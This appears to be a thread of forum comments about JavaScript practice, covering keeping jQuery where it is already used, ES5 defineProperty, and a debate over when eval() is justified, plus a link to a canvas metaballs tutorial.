Disagree. If that was the **only** place jQuery was used, then yeah, what you suggest would make sense because you could remove the jQuery dependency altogether. However, they use it all over the place, and so to posit that they "use jquery _just_ to use jquery" is really reaching for it -- they use it because it's in use everywhere else in the app. Removing it in favor of vanilla JS just in this one spot, when there's clearly negligible performance difference (or any other negative impact on code quality), is **removing it _just_ to remove it**. Which doesn't make sense, IMO.
Interesting approach. What's wrong with defineProperty, the lack of oldIE support? Or maybe you just prefer that style of API over ES5 properties?
I think there is a little misrepresentation in the article: &gt;Despite popular theory (and Crockford’s insistence), the mere presence of eval() does not indicate a problem When the quote given above by Crockford contains: &gt;This is sometimes necessary, but in most cases They're not insisting that it's mere presence indicates a problem, but that there **may** be a better way. Which is correct. So the tl;dr is that it depends on it's use, and it's slower than normal code so it should be avoided unless necessary. So we're back to square one - if you need it, use it. What I'd like to see are some cool uses of eval (I know lodash uses it to get around function calling) where it's worth using it.
I did an article forever ago that explains how to create metaballs, I adapted it from a great tutorial that was written for XNA http://www.somethinghitme.com/2012/06/06/2d-metaballs-with-canvas/
&gt; There are definitely concerns with code clarity, debugability, and certainly performance that should not be overlooked. But you shouldn’t be afraid to use it when you have a case where eval() makes sense. Reading this post, what I think would be more helpful would be to draw up a situation where eval "makes sense". Just because the pitfalls of eval can be avoided in some cases doesn't explain the beneficial use-cases of eval. I'm not saying there aren't such examples ... just that discussion would be more meaningful to talk about the application of eval(), not just the ways to avoid common mistakes when using it.